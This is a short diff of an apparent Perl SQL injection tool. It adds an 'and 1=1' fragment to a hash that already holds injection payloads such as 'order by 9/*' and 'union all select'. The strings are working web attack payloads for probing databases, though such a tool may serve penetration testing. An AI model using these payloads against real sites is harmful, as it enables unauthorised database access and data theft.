@@ -36,7 +36,9 @@ my %injection_codes = (
                       "ordernine" => "order by 9/*",
                       "orderten" => "order by 10/*",
                       #union clause
-                      "" => "union all select"
+                      "" => "union all select",
+                      #and and other logical clauses
+                      "and" => "'and 1=1'"            
                       );
 
 sub usage {
